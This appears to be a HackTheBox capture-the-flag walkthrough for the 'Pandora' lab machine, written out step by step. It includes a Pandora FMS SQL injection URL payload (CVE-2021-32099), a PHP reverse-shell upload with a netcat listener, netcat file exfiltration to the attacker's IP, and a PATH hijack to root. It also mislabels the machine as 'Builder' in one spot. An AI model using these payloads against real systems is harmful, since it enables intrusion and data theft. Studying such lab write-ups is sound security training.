title: Pandora @ HackTheBox
---

Pandorais a easy-difficulty [hackthebox.eu](https://www.hackthebox.eu) machine. Initial access is gained through enumerating a exposed UDP port of 161, running snmpbulkwalk on the exposed port reveals a username and password which allows for SSH access. The user flag is obtained by enumerating the Apache2 folder and finding a hidden domain, port-forwarding this domain to your local machine and using a CVE gains you access to the administrator panel. Uploading a malicious extension gains access to the 'Matt' account. To gain root, running linpeas exposes a hidden backup file. Transfering this file to your local machine and running strings on the executeable exposes a path injection vulnerability. But due to some-weird apache-ness, you will need to upload your own SSH public key in order to exploit this properly.

## User & Root Flag
This post is a walkthrough for Builder, an Medium machine on [hackthebox.eu](https://www.hackthebox.eu). 

The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.190.120`) shows the following results:
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

However, port 80 has nothing of use. (use -v because this scan takes ages)
The UDP port scan (though time-consuming) reveals port 161.
```
sudo nmap -sU 10.129.190.120 -v
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-23 02:04 BST

```

## Daniel - user 1
because snmp outputs tons of information, download this to reduce the excess junk.
```
sudo apt install snmp-mibs-downloader
sudo nano /etc/snmp/snmp.conf
//comment mibs out
```
use snmpbulkwalk to enumerate port 161.
```
snmpbulkwalk -c public -v2c 10.129.190.120 . > snmpcheck
```

Once finished, we can use grep to see how many times a parameter has been issued.
```
grep -oP '::.*?\.' snmpcheck | sort | uniq -c | sort -n 
```
The main ones we care about are:
- hrSWRunParameters
- hrSWInstalled

Grepping out the file and searching for `hrSWRunParameters` eventually reveals a username and password.
```
cat snmpcheck | grep hrSWRunParameters
OST-RESOURCES-MIB::hrSWRunParameters.963 = STRING: "-c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p <REDACTED>'"

// you can also check to see what was happening by filtering out the task number (not required)
grep hrSWRun snmpcheck | grep 963 
```

Use these credentials on daniel's SSH service.
```
ssh daniel@10.129.190.120
```
Enumerating the Apache2 sites-available exposes a hidden domain under localhost.
```
daniel@pandora:/etc/apache2/sites-enabled$ cat ../sites-available/pandora.conf
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

To access this, we have to first port-forward port 80 to our local machine.
```
ssh daniel@10.129.190.120 -L 8000:127.0.0.1:80
// explaination
First we take our port which is 8000 (this is the port we will visit)
127.0.0.1 is the local host on the victims machine where the service is running from
port 80 is the port we want to forward.
```
Once forwarded, visit `http://localhost:8000`
Doing some research on pandorafms reveals an unauthenticated SQL injection attack which gains administrator access.<br>
`https://github.com/akr3ch/CVE-2021-32099`<br>

Copying and executing this gains administrator access.
```
http://localhost:8000/pandora_console/include/chart_generator.php?session_id=a' UNION SELECT 'a',1,'id_usuario|s:5:"admin";' as data FROM tsessions_php WHERE '1'='1
```

## Matt - user 2
Once admin access has been established, there are different ways you can get internal access, either by using another CVE (authenticated) or by uploading your own php reverse shell.<br>
To upload your own php reverse shell follow these steps:
```
1 - Make a PHP reverse shell (pentest monkey works fine)
2 - Zip it (important)
3 - Visit http://localhost:8000/pandora_console/index.php
4 - go to Admin Tools → Extension Manager → Extension Uploader
5 - Upload your zipped reverse shell.
6 - set up netcat listener (nc -lvnp 1234)
6 - Trigger shell by visiting http://localhost:8000/pandora_console/extensions/rev.php
```

If everything goes well, you now have access to matt's account.
As matts shell is not stable, lets upgrade it.
```
< INSIDE MATTS SHELL >
[Shell] python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl-z
stty raw -echo; fg
[Shell] export TERM=xterm
```

Once you have upgraded matts shell, grab his user flag.

## Root
upload linpeas to the machine and run it
```
[you] python3 -m http.server 80
[victim] wget http://your_ip:80/linpeas.sh
[victim] chmod +x linpeas.sh
[victim] .\linpeas.sh
```
Eventually you find that netcat is installed and a hidden backup folder exists at `/usr/bin/pandora_backup`<br>
Because you can't use strings on the machine, we have to transfer it off.
Theres different ways you can do this i.e. wget etc, but I'm using nc for simplicity.
```
[VICTIM]nc your_ip 9002 < /usr/bin/pandora_backup
[YOU]nc -lvnp 9002 > pandora_backup
```

Run strings on the downloaded file and you'll spot a command
```
tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*
```
Because this uses a relative path and not an absoulte path i.e. (/usr/bin/tar), it's vulnerable to a PATH injection attack.
But before we can do that, we have to upload our own SSH public key due to apache.
```
[YOU] ssh-keygen -f matt
[victim] mkdir .ssh
[victim] wget your_ip:80/matt.pub
[victim] mv matt.pub authorized_keys
[YOU] ssh -i matt matt@10.129.190.120

// if this doesnt work
[victim] chmod 700 ~/.ssh
[victim] chmod 600 ~/.ssh/authorized_keys
```

Export your path and run the command to gain root.
```
matt@pandora:~$ which tar
/usr/bin/tar
matt@pandora:~$ echo /bin/bash > tar
chmod +x tar

// path hijack
export PATH=/home/matt:$PATH
matt@pandora:~$ which tar
/home/matt/tar

matt@pandora:~$ /usr/bin/pandora_backup
